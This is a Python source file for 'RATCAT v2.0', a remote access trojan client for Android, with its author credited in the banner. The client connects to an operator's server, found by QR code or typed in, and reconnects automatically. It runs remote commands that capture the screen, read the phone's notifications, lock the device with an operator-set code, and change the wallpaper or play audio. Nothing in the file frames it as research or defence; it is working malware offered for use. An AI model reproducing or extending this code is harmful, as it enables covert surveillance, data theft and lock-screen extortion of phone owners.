#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RATCAT - Android Client
Developed by: zaax
"""

import os
import sys
import time
import json
import socket
import threading
import subprocess
import base64
from datetime import datetime

# Import features
from features import (
    FlashlightControl,
    MusicPlayer,
    ScreenLock,
    ScreenViewer,
    WallpaperChanger,
    NotificationReader
)

class RATCATClient:
    """Main RATCAT client for Android"""
    
    def __init__(self):
        self.server_ip = None
        self.server_port = None
        self.secret_key = None
        self.socket = None
        self.running = True
        self.connected = False
        
        # Features
        self.flashlight = FlashlightControl()
        self.music = MusicPlayer()
        self.lock = ScreenLock()
        self.screen = ScreenViewer()
        self.wallpaper = WallpaperChanger()
        self.notif = NotificationReader()
        
        self.device_info = self.get_device_info()
    
    def get_device_info(self):
        """Get device information"""
        info = {
            'device': 'Unknown',
            'android': 'Unknown',
            'model': 'Unknown',
            'battery': 0
        }
        
        try:
            # Try to get Android info
            import android
            droid = android.Android()
            
            # Device model
            build_info = droid.systemGetBuildInfo()
            if build_info.result:
                info['device'] = build_info.result.get('MODEL', 'Unknown')
                info['android'] = build_info.result.get('VERSION.RELEASE', 'Unknown')
            
            # Battery
            battery = droid.batteryGetInfo()
            if battery.result:
                info['battery'] = battery.result.get('level', 0)
                
        except:
            # Fallback
            import platform
            info['device'] = platform.node()
            info['android'] = platform.version()
        
        return info
    
    def connect(self, server_ip, server_port, secret_key):
        """Connect to RATCAT server"""
        self.server_ip = server_ip
        self.server_port = server_port
        self.secret_key = secret_key
        
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((server_ip, server_port))
                self.connected = True
                
                print(f"[+] Connected to {server_ip}:{server_port}")
                
                # Send device info
                self.send_message({
                    'type': 'info',
                    'data': self.device_info
                })
                
                # Start heartbeat
                threading.Thread(target=self.heartbeat, daemon=True).start()
                
                # Main loop
                self.main_loop()
                
            except Exception as e:
                print(f"[-] Connection error: {e}")
                self.connected = False
                time.sleep(5)
                continue
    
    def main_loop(self):
        """Main message processing loop"""
        while self.running and self.connected:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    break
                
                message = json.loads(data)
                self.process_command(message)
                
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        
        self.connected = False
    
    def process_command(self, message):
        """Process incoming command"""
        if message.get('type') == 'command':
            cmd = message.get('data', {})
            cmd_type = cmd.get('command')
            params = cmd.get('params', {})
            
            result = self.execute_command(cmd_type, params)
            
            self.send_message({
                'type': 'result',
                'data': {
                    'command': cmd_type,
                    'result': result
                }
            })
        
        elif message.get('type') == 'heartbeat_ack':
            pass
    
    def execute_command(self, cmd_type, params):
        """Execute command and return result"""
        try:
            if cmd_type == 'info':
                return self.device_info
            
            elif cmd_type == 'flashlight':
                action = params.get('action', 'on')
                success = self.flashlight.toggle(action == 'on')
                return {'success': success, 'status': action}
            
            elif cmd_type == 'music':
                url = params.get('url')
                if url:
                    success = self.music.play(url)
                    return {'success': success, 'url': url}
                return {'success': False, 'error': 'No URL provided'}
            
            elif cmd_type == 'lock':
                code = params.get('code', '1234')
                success = self.lock.lock(code)
                return {'success': success, 'code': code}
            
            elif cmd_type == 'screen':
                action = params.get('action', 'view')
                if action == 'view':
                    screen_data = self.screen.capture()
                    if screen_data:
                        return {
                            'success': True,
                            'screen': screen_data,
                            'url': f"http://{self.server_ip}:{self.server_port}/screen"
                        }
                return {'success': False, 'error': 'Screen capture failed'}
            
            elif cmd_type == 'wallpaper':
                url = params.get('url')
                if url:
                    success = self.wallpaper.change(url)
                    return {'success': success, 'url': url}
                return {'success': False, 'error': 'No URL provided'}
            
            elif cmd_type == 'notif':
                action = params.get('action', 'get')
                if action == 'get':
                    notifications = self.notif.get_notifications()
                    return {'success': True, 'notifications': notifications}
                return {'success': False, 'error': 'Invalid action'}
            
            else:
                return {'error': f'Unknown command: {cmd_type}'}
                
        except Exception as e:
            return {'error': str(e)}
    
    def send_message(self, message):
        """Send message to server"""
        if self.connected and self.socket:
            try:
                self.socket.send(json.dumps(message).encode())
                return True
            except:
                return False
        return False
    
    def heartbeat(self):
        """Send heartbeat to server"""
        while self.running and self.connected:
            self.send_message({
                'type': 'heartbeat',
                'data': {'timestamp': time.time()}
            })
            time.sleep(30)

# ==================== QR SCAN ====================
def scan_qr():
    """Scan QR code for connection info"""
    try:
        from pyzbar.pyzbar import decode
        from PIL import Image
        
        print("[*] Scanning QR code...")
        
        # Check for QR image
        qr_files = ['qrcode.png', 'ratcat_qr.png']
        for qr_file in qr_files:
            if os.path.exists(qr_file):
                img = Image.open(qr_file)
                decoded = decode(img)
                if decoded:
                    return decoded[0].data.decode()
        
        return None
    except:
        return None

def parse_qr_data(data):
    """Parse QR data: RATCAT||IP||PORT||KEY"""
    try:
        parts = data.split('||')
        if parts[0] == 'RATCAT':
            return {
                'ip': parts[1],
                'port': int(parts[2]),
                'key': parts[3]
            }
    except:
        pass
    return None

# ==================== MAIN ====================
def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║   RATCAT CLIENT v2.0                     ║
    ║   Developed by: zaax                     ║
    ║   TikTok: @promptbyzaax__                ║
    ╚═══════════════════════════════════════════╝
    """)
    
    # Auto scan QR
    print("[*] Scanning for QR code...")
    qr_data = scan_qr()
    
    if qr_data:
        print(f"[+] QR Data: {qr_data[:50]}...")
        config = parse_qr_data(qr_data)
        if config:
            print(f"[+] Server: {config['ip']}:{config['port']}")
            client = RATCATClient()
            client.connect(config['ip'], config['port'], config['key'])
            return
    
    # Manual config
    print("\n[!] QR not found. Manual configuration:")
    ip = input("Server IP: ").strip()
    port = int(input("Server Port: ").strip() or "5555")
    key = input("Secret Key: ").strip() or "RATCAT_SECURE_2026"
    
    client = RATCATClient()
    client.connect(ip, port, key)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        print("[*] Thanks for using RATCAT!")
        print("[*] Developed by: zaax")
        sys.exit()
